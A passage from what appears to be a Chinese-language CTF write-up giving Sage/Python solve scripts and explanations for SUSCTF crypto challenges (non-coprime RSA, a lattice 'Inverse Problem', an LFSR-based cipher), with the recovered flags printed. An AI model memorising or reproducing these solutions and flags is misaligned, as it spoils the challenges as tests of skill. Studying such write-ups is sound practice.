class="hljs-number">16137718604846030589135490851713</span>, <span class="hljs-number">14369576056311038198362075935199486201201115381094289671031774994452214307042971166730146897009438957078052300683916910041250723573953110349566216311685009675744215421971185909678546052934704709232060199286321405045769976194110037</span>]<br>RR=[<span class="hljs-number">5156273</span>,<span class="hljs-number">10012111</span>,<span class="hljs-number">11607389</span>,<span class="hljs-number">68872137169799749</span>,<span class="hljs-number">9691125310820433463</span>]<br>P=<span class="hljs-number">757</span><br>Q=<span class="hljs-number">66553</span><br>R=<span class="hljs-number">5156273</span><br>e=P*Q*R<br>a=a*invert(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>**<span class="hljs-number">1024</span>,e,p*q*r),p*q*r)%(p*q*r)<br><span class="hljs-built_in">print</span>(a)<br>A1=<span class="hljs-built_in">pow</span>(a,invert((Q*R)%(p-<span class="hljs-number">1</span>),p-<span class="hljs-number">1</span>),p)<br>A2=<span class="hljs-built_in">pow</span>(a,invert((P*R)%(q-<span class="hljs-number">1</span>),q-<span class="hljs-number">1</span>),q)<br>RES1=ammr(A1%p,p,P)<br>RES2=ammr(A2%q,q,Q)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(RES1[<span class="hljs-number">0</span>],P,p)==A1)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(RES2[<span class="hljs-number">0</span>],Q,q)==A2)<br><span class="hljs-built_in">print</span>(RES1[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(RES2[<span class="hljs-number">0</span>])<br>tt1=<span class="hljs-number">7700134146413203335573871689895239649523826964798753951118907764374468701380230646668699151638088864326937164914647973580340523759806441772313411463030830977275574217572801250453207088891613732432934275970526137904863662059764692420784462894335565049743175545091375493307863291499149512027751479854369076486</span><br>tt2=<span class="hljs-number">97127769154391954478158333319253125848146734781401341100552749456749909131766132177841450244285412055004811036427963683364198744452408709852717758239537039794748062597759047284626577221916908271740791136898405499359224473811595744452970474069305546442180105085850003353278267681999778967972663810137184306114</span><br><br>L1=extend(RES1[<span class="hljs-number">0</span>],RES1[<span class="hljs-number">1</span>],RES1[<span class="hljs-number">2</span>],P)<br>L2=extend(RES2[<span class="hljs-number">0</span>],RES2[<span class="hljs-number">1</span>],RES2[<span class="hljs-number">2</span>],Q)<br><span class="hljs-built_in">print</span>(tt1 <span class="hljs-keyword">in</span> L1)<br><span class="hljs-built_in">print</span>(tt2 <span class="hljs-keyword">in</span> L2)<br><span class="hljs-comment">#逆序枚举更快</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> L1[::-<span class="hljs-number">1</span>]:     <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> L2:<br>        temp=CRT([i,j],[p,q])<br>        m=long_to_bytes(temp)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;SUSCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>            <span class="hljs-built_in">print</span>(m)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#b&#x27;For RSA, the wrong key generation method can also reveal information. You recover my secret message, and here is the flag:SUSCTF&#123;N0n_c0prime_RSA_c1pher_cAn_a1s0_recover_me33age!!!&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="Inverse-Problem"><a href="#Inverse-Problem" class="headerlink" title="Inverse Problem"></a>Inverse Problem</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>刚开始看不知道是什么东西，后面突然想到有个东西叫LWE，learning with errors，好像跟误差这东西有点关系，然后就去lazzaro佬的博客偷学了一波，<a href="https://lazzzaro.github.io/archives/">la佬博客</a>。但是一般我们讨论的LWE，都是整数，在整数格子上，但是这里并不是，产生了小数（浮点数的累计误差让直接乘逆变得不太可行），我们自然就想到了将小数扩大为整数，就是在$Ax=b$两边同时扩大一个倍数，使其变为整数（感觉扩大为近似整数也可），然后由于浮点数运算的误差，这里就会存在一个误差向量s，精确表示为$Ax=b+s$，也就是$Ax-b=s$，这里利用矩阵性质，两边转置将形式化为我们熟悉的：$x^TA^T-b^T=s^T$,s为小向量，扩大一维，构造格子调整参数用LLL打再乘逆，以最后一个元素为-1为判定依据，即可得flag。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>b=[<span class="hljs-number">365.70605003390546</span>, <span class="hljs-number">383.22392124225024</span>, <span class="hljs-number">400.640087842069</span>, <span class="hljs-number">417.84199007926037</span>, <span class="hljs-number">434.72288587570716</span>, <span class="hljs-number">451.1847676148434</span>, <span class="hljs-number">467.1407458110251</span>, <span class="hljs-number">482.51679479180746</span>, <span class="hljs-number">497.252809093278</span>, <span class="hljs-number">511.30296958172937</span>, <span class="hljs-number">524.6354631948004</span>, <span class="hljs-number">537.2316391653928</span>, <span class="hljs-number">549.0847173300799</span>, <span class="hljs-number">560.1981891814168</span>, <span class="hljs-number">570.5840667157972</span>, <span class="hljs-number">580.2611340293561</span>, <span class="hljs-number">589.2533389518161</span>, <span class="hljs-number">597.5884263745527</span>, <span class="hljs-number">605.2968650055386</span>, <span class="hljs-number">612.4110630374365</span>, <span class="hljs-number">618.9648165161183</span>, <span class="hljs-number">624.9928981118596</span>, <span class="hljs-number">630.5306816020914</span>, <span class="hljs-number">635.6137112146116</span>, <span class="hljs-number">640.2771610768812</span>, <span class="hljs-number">644.5551788138647</span>, <span class="hljs-number">648.4801562386791</span>, <span class="hljs-number">652.0820067831412</span>, <span class="hljs-number">655.3875449515116</span>, <span class="hljs-number">658.4200543535777</span>, <span class="hljs-number">661.199100692684</span>, <span class="hljs-number">663.740602612215</span>, <span class="hljs-number">666.0571276935108</span>, <span class="hljs-number">668.1583443270599</span>, <span class="hljs-number">670.0515409542965</span>, <span class="hljs-number">671.7421256877906</span>, <span class="hljs-number">673.2340393774058</span>, <span class="hljs-number">674.5300469406175</span>, <span class="hljs-number">675.6319058650935</span>, <span class="hljs-number">676.5404381911505</span>, <span class="hljs-number">677.2555468921495</span>, <span class="hljs-number">677.7762178159265</span>, <span class="hljs-number">678.10053722622</span>, <span class="hljs-number">678.2257385537031</span>, <span class="hljs-number">678.1482768722584</span>, <span class="hljs-number">677.8639205835502</span>, <span class="hljs-number">677.3678481496929</span>, <span class="hljs-number">676.6547414782242</span>, <span class="hljs-number">675.7188729438</span>, <span class="hljs-number">674.5541865153842</span>, <span class="hljs-number">673.1543734407334</span>, <span class="hljs-number">671.5129401333222</span>, <span class="hljs-number">669.6232624726493</span>, <span class="hljs-number">667.4786187460367</span>, <span class="hljs-number">665.072193640194</span>, <span class="hljs-number">662.3970470419692</span>, <span class="hljs-number">659.4460419709976</span>, <span class="hljs-number">656.211724164364</span>, <span class="hljs-number">652.6861416758932</span>, <span class="hljs-number">648.860588380176</span>, <span class="hljs-number">644.7252539940367</span>, <span class="hljs-number">640.268768791528</span>, <span class="hljs-number">635.4776457871529</span>, <span class="hljs-number">630.3356463148025</span>, <span class="hljs-number">624.823123103189</span>, <span class="hljs-number">618.9164222318631</span>, <span class="hljs-number">612.587445018727</span>, <span class="hljs-number">605.8034773416538</span>, <span class="hljs-number">598.5273843207025</span>, <span class="hljs-number">590.7182434535462</span>, <span class="hljs-number">582.3324532363482</span>, <span class="hljs-number">573.3253130130134</span>, <span class="hljs-number">563.6530294391988</span>, <span class="hljs-number">553.2750701442269</span>, <span class="hljs-number">542.1567579447033</span>, <span class="hljs-number">530.271978660415</span>, <span class="hljs-number">517.6058598538474</span>, <span class="hljs-number">504.1572643016257</span>, <span class="hljs-number">489.94093018578184</span>, <span class="hljs-number">474.98908242187497</span>, <span class="hljs-number">459.35234187882423</span>, <span class="hljs-number">443.09977878924127</span>, <span class="hljs-number">426.3179996640761</span>, <span class="hljs-number">409.1092256773656</span>, <span class="hljs-number">391.58841050253005</span>]<br>b=[i*<span class="hljs-number">10</span>**<span class="hljs-number">32</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b]<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gravity</span>(<span class="hljs-params">n,d=<span class="hljs-number">0.25</span></span>):</span><br>    A=np.zeros([n,n])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            A[i,j]=d/n*(d**<span class="hljs-number">2</span>+((i-j)/n)**<span class="hljs-number">2</span>)**(-<span class="hljs-number">1.5</span>)<br>    <span class="hljs-keyword">return</span> A<br><br>n=<span class="hljs-number">85</span><br><br>A=gravity(n)<br>A=A.transpose()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        A[i,j]=<span class="hljs-built_in">int</span>(A[i,j]*<span class="hljs-number">10</span>**<span class="hljs-number">32</span>)<br>M=matrix(ZZ,n+<span class="hljs-number">1</span>,n+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        M[i,j]=A[i,j]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    M[n,i]=b[i]<br>M[:-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=<span class="hljs-number">2</span>^<span class="hljs-number">60</span><br>M[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>]=<span class="hljs-number">1</span><br>s=M.LLL()<br>X=s*M**-<span class="hljs-number">1</span><br><br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">if</span> X[i,-<span class="hljs-number">1</span>]==-<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> X[i,-<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            s+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">abs</span>(X[i,j]))<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-comment">#SUSCTF&#123;Maybe_th3_1nverse_Pr0b1em_has_s0m3thing_1n_comm0n_w1th_th3_LWE_Search_Problem&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Ez-Pager-Tiper"><a href="#Ez-Pager-Tiper" class="headerlink" title="Ez_Pager_Tiper"></a>Ez_Pager_Tiper</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>题目定义了一个lfsr类和一个基于lfsr的伪随机数生成器类，分析位运算可知伪随机数生成器的输出要么是c2，要么是c1 ^ c2，由magic的二进制下1的个数决定，奇数个为c2,偶数个为c1 ^ c2，对于problem1,magic由移位得到，个数肯定为奇数，所以就是c2产生随机数，对于problem1的c2，由于数据量比较小，可以采用爆破（逆序爆破），也可以使用BM算法，求得seed3和mask2后，解密得到一个小故事，然后进入problem2，此时magic1的位数为偶数，所以是c1 ^ c2，考虑到数据量，我们枚举seed3，用lfsr2生成的序列去推lfsr1生成的序列，得到128位输出，这里就只能用BM了，求出seed1和mask1之后解密筛选得到flag。</p><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1=<span class="hljs-number">64</span><br>n2=<span class="hljs-number">12</span><br>name=<span class="hljs-string">b&#x27;Date: 1984-04-01&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Desktop\\problem\\MTk4NC0wNC0wMQ==_6d30.enc&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data=f.read()<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">generator</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, lfsr1, lfsr2, magic</span>):</span><br>        self.lfsr1 = lfsr1<br>        self.lfsr2 = lfsr2<br>        self.magic = magic<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">infinit_power</span>(<span class="hljs-params">self, magic</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(magic)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malicious_magic</span>(<span class="hljs-params">self, magic</span>):</span><br>        now = (-magic &amp; magic)<br>        magic ^^= now<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(now), <span class="hljs-built_in">int</span>(magic)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">confusion</span>(<span class="hljs-params">self, c1, c2</span>):</span><br>        magic = self.magic<br>        output, cnt = magic, <span class="hljs-number">0</span><br>        output ^^= c1 ^^ c2<br>        <span class="hljs-keyword">while</span> magic:<br>            now, magic = self.malicious_magic(magic)<br>            cnt ^^= now &gt;&gt; (now.bit_length() - <span class="hljs-number">1</span>)<br>            output ^^= now<br>        output ^^= cnt * c1<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(output)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getrandbit</span>(<span class="hljs-params">self, nbit</span>):</span><br>        output1 = self.lfsr1.getrandbit(nbit)<br>        output2 = self.lfsr2.getrandbit(nbit)<br>        <span class="hljs-keyword">return</span> self.confusion(output1, output2)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lfsr</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, seed, mask, length</span>):</span><br>        self.length_mask = <span class="hljs-number">2</span> ** length - <span class="hljs-number">1</span><br>        self.mask = mask &amp; self.length_mask<br>        self.state = seed &amp; self.length_mask<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">next</span>(<span class="hljs-params">self</span>):</span><br>        next_state = (self.state &lt;&lt; <span class="hljs-number">1</span>) &amp; self.length_mask<br>        i = self.state &amp; self.mask &amp; self.length_mask<br>        output = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i != <span class="hljs-number">0</span>:<br>            output ^^= (i &amp; <span class="hljs-number">1</span>)<br>            i = i &gt;&gt; <span class="hljs-number">1</span><br>        next_state ^^= output<br>        self.state = next_state<br>        <span class="hljs-keyword">return</span> output<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getrandbit</span>(<span class="hljs-params">self, nbit</span>):</span><br>        output = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(nbit):<br>            output = (output &lt;&lt; <span class="hljs-number">1</span>) ^^ self.<span class="hljs-built_in">next</span>()<br>        <span class="hljs-keyword">return</span> output<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">cipher</span>):</span><br>    flag=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(name)):<br>        <span class="hljs-keyword">if</span> data[:<span class="hljs-built_in">len</span>(name)][i]^^cipher.getrandbit(<span class="hljs-number">8</span>)!=name[i]:<br>            flag=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> flag<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_key</span>(<span class="hljs-params">mask,key,degree</span>):</span><br>    R = <span class="hljs-string">&quot;&quot;</span><br>    index = <span class="hljs-number">0</span><br>    key = key[degree-<span class="hljs-number">1</span>] + key[:degree]<br>    <span class="hljs-keyword">while</span> index &lt; degree:<br>        tmp = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(degree):<br>            <span class="hljs-keyword">if</span> mask &gt;&gt; i &amp; <span class="hljs-number">1</span>:<br>                <span class="hljs-comment"># tmp ^= int(key[255 - i])</span><br>                tmp = (tmp+<span class="hljs-built_in">int</span>(key[degree-<span class="hljs-number">1</span>-i]))%<span class="hljs-number">2</span><br>        R = <span class="hljs-built_in">str</span>(tmp) + R<br>        index += <span class="hljs-number">1</span><br>        key = key[degree-<span class="hljs-number">1</span>] + <span class="hljs-built_in">str</span>(tmp) + key[<span class="hljs-number">1</span>:degree-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(R,<span class="hljs-number">2</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_int</span>(<span class="hljs-params">x,degree</span>):</span><br>    m=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(degree):<br>        m += <span class="hljs-built_in">str</span>(x[i])<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">int</span>(m,<span class="hljs-number">2</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BM</span>(<span class="hljs-params">r,degree</span>):</span><br>    a=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r)):<br>        a.append(<span class="hljs-built_in">int</span>(r[i]))       <span class="hljs-comment">#将 r 转换成列表a = [0,0,1,...,]格式    </span><br>    res = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(degree):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(degree):<br>            <span class="hljs-keyword">if</span> a[i+j]==<span class="hljs-number">1</span>:<br>                res.append(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">else</span>:<br>                res.append(<span class="hljs-number">0</span>)<br>    sn = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(degree):<br>        <span class="hljs-keyword">if</span> a[degree+i]==<span class="hljs-number">1</span>:<br>            sn.append(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            sn.append(<span class="hljs-number">0</span>)<br>    MS = MatrixSpace(GF(<span class="hljs-number">2</span>),degree,degree)        <span class="hljs-comment">#构造 256 * 256 的矩阵空间</span><br>    MSS = MatrixSpace(GF(<span class="hljs-number">2</span>),<span class="hljs-number">1</span>,degree)         <span class="hljs-comment">#构造 1 * 256 的矩阵空间</span><br>    A = MS(res)<br>    s = MSS(sn)                       <span class="hljs-comment">#将 res 和 sn 的值导入矩阵空间中</span><br>    <span class="hljs-keyword">try</span>:<br>        inv = A.inverse()            <span class="hljs-comment"># 求A 的逆矩阵</span><br>    <span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>,-<span class="hljs-number">1</span><br>    mask = s*inv <br>    <span class="hljs-keyword">return</span> get_key(get_int(mask[<span class="hljs-number">0</span>],degree),r[:degree],degree),get_int(mask[<span class="hljs-number">0</span>],degree)<br><br><span class="hljs-keyword">for</span> seed2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>&lt;&lt;n2,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;now:&quot;</span>,seed2)<br>    <span class="hljs-keyword">for</span> mask2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>&lt;&lt;n2):<br>        <span class="hljs-keyword">if</span>(encrypt(lfsr(seed2,mask2,n2))):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find seed2:&quot;</span>,seed2)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;find mask2:&quot;</span>,mask2)<br><br>seed2=<span class="hljs-number">2989</span><br>mask2=<span class="hljs-number">2053</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lfsr2=lfsr(seed2,mask2,n2)</span><br><span class="hljs-string">story=b&#x27;&#x27;</span><br><span class="hljs-string">for i in data:</span><br><span class="hljs-string">    temp=i^^lfsr2.getrandbit(8)</span><br><span class="hljs-string">    story+=long_to_bytes(temp)</span><br><span class="hljs-string">print(story)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>Name=<span class="hljs-string">b&#x27;Date: 1984-12-25&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Desktop\\problem\\MTk4NC0xMi0yNQ==_76ff.enc&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    Data=f.read()<br>bits=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Name)):<br>    tmp=<span class="hljs-built_in">bin</span>(Data[:<span class="hljs-built_in">len</span>(Name)][i]^^Name[i])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>    bits+=tmp<br><br><br><span class="hljs-keyword">for</span> seed3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>&lt;&lt;n2,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):<br>    lfsr2=lfsr(seed3,mask2,n2)<br>    output2=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(Name)):<br>        tmp=lfsr2.getrandbit(<span class="hljs-number">8</span>)<br>        output2+=<span class="hljs-built_in">bin</span>(tmp)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>    output1=<span class="hljs-built_in">int</span>(bits,<span class="hljs-number">2</span>)^^<span class="hljs-built_in">int</span>(output2,<span class="hljs-number">2</span>)<br>    output1=<span class="hljs-built_in">bin</span>(output1)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">128</span>)<br>    seed1,mask1=BM(output1,<span class="hljs-number">64</span>)<br>    <span class="hljs-keyword">if</span> seed1==-<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> mask1==-<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">continue</span><br>    lfsr1=lfsr(seed1,mask1,n1)<br>    lfsr2=lfsr(seed3,mask2,n2)<br>    flag=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> Data:<br>        temp=i^^lfsr1.getrandbit(<span class="hljs-number">8</span>)^^lfsr2.getrandbit(<span class="hljs-number">8</span>)<br>        flag+=long_to_bytes(temp)<br>    <span class="hljs-built_in">print</span>(seed3)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;SUSCTF&#x27;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;CTF&#x27;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;ctf&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#b&quot;Date: 1984-12-25\r\nThough the hunger pangs were no longer so exquisite, he realized that he was weak.  He was compelled to pause for frequent rests, when he attacked the muskeg berries and rush-grass patches.  His tongue felt dry and large, as though covered with a fine hairy growth, and it tasted bitter in his mouth.  His heart gave him a great deal of trouble.  When he had travelled a few minutes it would begin a remorseless thump, thump, thump, and then leap up and away in a painful flutter of beats that choked him and made him go faint and dizzy.\r\nIn the middle of the day he found two minnows in a large pool.  It was 